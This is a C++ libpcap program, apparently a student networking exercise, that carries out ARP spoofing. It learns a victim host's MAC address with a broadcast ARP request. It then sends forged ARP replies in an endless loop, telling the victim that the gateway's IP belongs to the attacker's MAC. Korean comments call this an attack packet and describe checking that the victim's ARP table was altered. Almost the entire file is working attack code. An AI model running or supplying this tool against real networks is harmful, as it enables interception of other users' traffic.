#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "mac.h"
#include "ip.h"
#include <sys/types.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <net/if_dl.h>
#include <ifaddrs.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <net/if.h>
#include <net/if_dl.h>
#include <ifaddrs.h>
#include <errno.h>
#include <cstdlib>
#include <unistd.h>
#include <libnet.h>
#include <iostream>
#include <cstring>
#include <map>

#pragma pack(push, 1)
struct EthArpPacket {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}
void get_Ip (char* s)
{
    struct ifaddrs * ifAddrStruct=NULL;
    struct ifaddrs * ifa=NULL;
    void * tmpAddrPtr=NULL;      

    getifaddrs(&ifAddrStruct);

    for (ifa = ifAddrStruct; ifa != NULL; ifa = ifa->ifa_next) {
        if (ifa ->ifa_addr->sa_family==AF_INET) { // check it is IP4
            // is a valid IP4 Address
            tmpAddrPtr=&((struct sockaddr_in *)ifa->ifa_addr)->sin_addr;
            char addressBuffer[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, tmpAddrPtr, addressBuffer, INET_ADDRSTRLEN);
            strcpy(s,addressBuffer);
            //cout<<key<<value<<endl;
           // printf("'%s': %s\n", ifa->ifa_name, addressBuffer); 
         }
     }
    if (ifAddrStruct!=NULL) 
        freeifaddrs(ifAddrStruct);//remember to free ifAddrStruct
}
void get_Mac(uint8_t* my_mac,char* dev) {
  struct ifaddrs *if_addrs = NULL;
  struct ifaddrs *if_addr = NULL;
  void *tmp = NULL;
  char buf[INET6_ADDRSTRLEN];

  if (0 == getifaddrs(&if_addrs)) {    
    for (if_addr = if_addrs; if_addr != NULL; if_addr = if_addr->ifa_next) {
        if(strcmp(if_addr->ifa_name,dev)==0){
      if (if_addr->ifa_addr != NULL && if_addr->ifa_addr->sa_family == AF_LINK) {
        struct sockaddr_dl* sdl = (struct sockaddr_dl *)if_addr->ifa_addr;
        unsigned char mac[6];
        if (6 == sdl->sdl_alen) {
          memcpy(mac, LLADDR(sdl), sdl->sdl_alen);
          for(int j=0;j<6;j++){
              my_mac[5-j]=mac[5-j];
          }
        }
      }
	          }
    }
    freeifaddrs(if_addrs);
    if_addrs = NULL;
  } /*else {
    printf("getifaddrs() failed with errno =  %i %s\n", errno, strerror(errno));
    return -1;
  }*/

}

int main(int argc, char* argv[]) {
	if (argc != 4) {
		usage();
		return -1;
	
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		printf("handle\n");
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	EthArpPacket packet;
	uint8_t my_mac[6]={0,};
	uint8_t your_mac[6]={0,};
	char my_ip[INET6_ADDRSTRLEN];

	char yu[6]={0,};
	std::string you_mac;
	Mac youu;
	get_Mac(my_mac,dev);
	get_Ip(my_ip);
	std::string My_ip(my_ip);
	//std::cout<<My_ip<<std::endl;
	//get_IP(my_ip);
	//my_ip=""
	packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");//ffffffffff(broadcast)
	packet.eth_.smac_ = Mac(my_mac);//my_mac
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(my_mac);//my_mac
	packet.arp_.sip_ = htonl(Ip(My_ip));//my_ip
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");//00000
	packet.arp_.tip_ = htonl(Ip(argv[2]));//sender ip
	int req = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	EthArpPacket *reply_packet;
	while(1){
		struct pcap_pkthdr* header;
        const u_char* repacket=NULL;
        int res1 = pcap_next_ex(handle, &header, &repacket);
		if (res1 == 0) continue;
        if (res1 == -1 || res1== -2) {
            printf("pcap_next_ex return %d(%s)\n", res1, pcap_geterr(handle));
            break;
		}
		reply_packet = (EthArpPacket*)repacket;
		//printf("%04x\n",reply_packet->eth_.type_);
		fflush(stdout);
		 if (reply_packet->eth_.type_ == (0x0608)){
			 //std::cout<<reply_packet->arp_.sip()<<'\n';
			 Ip ip = reply_packet->arp_.sip_;
			 if(strcmp(std::string(ip).c_str(),argv[2])==0){
			memcpy(your_mac, reply_packet->arp_.smac_, 6);
			printf("MAC주소 얻기 성공\n");
			break;
			 }
		}
    sleep(1);
    }
	EthArpPacket lastpacket;
	lastpacket.eth_.dmac_ = Mac(your_mac);//sender_mac
	lastpacket.eth_.smac_ = Mac(my_mac);//my_mac
	lastpacket.eth_.type_ = htons(EthHdr::Arp);

	lastpacket.arp_.hrd_ = htons(ArpHdr::ETHER);
	lastpacket.arp_.pro_ = htons(EthHdr::Ip4);
	lastpacket.arp_.hln_ = Mac::SIZE;
	lastpacket.arp_.pln_ = Ip::SIZE;
	lastpacket.arp_.op_ = htons(ArpHdr::Reply);
	lastpacket.arp_.smac_ = Mac(my_mac);//my_mac
	lastpacket.arp_.sip_ = htonl(Ip(argv[3]));//gateway
	lastpacket.arp_.tmac_ = Mac(your_mac);//sender mac
	lastpacket.arp_.tip_ = htonl(Ip(argv[2]));//sender ip
	while(1){
	int res2 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&lastpacket), sizeof(EthArpPacket));
	printf("변조시도 중\n");
	if (res2 != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res2, pcap_geterr(handle));
	}
	}

	pcap_close(handle);
}
// 자기 ip, 맥 어드레스 얻고
// sender ip는 ar1 tip는 ar2 
// sender의 맥 어드레스는 물어본다. sender ip 갖고있는애 broadcast로 mac주소 얻기
// mac주소를 얻고 공격패킷 만들어서 sender한테 보냄(smac은 자신, sip는 gateway, tmac은 sender, tip는 sender)
// sender 에서의 arp 테이블이 변조된것을 관찰 arp -an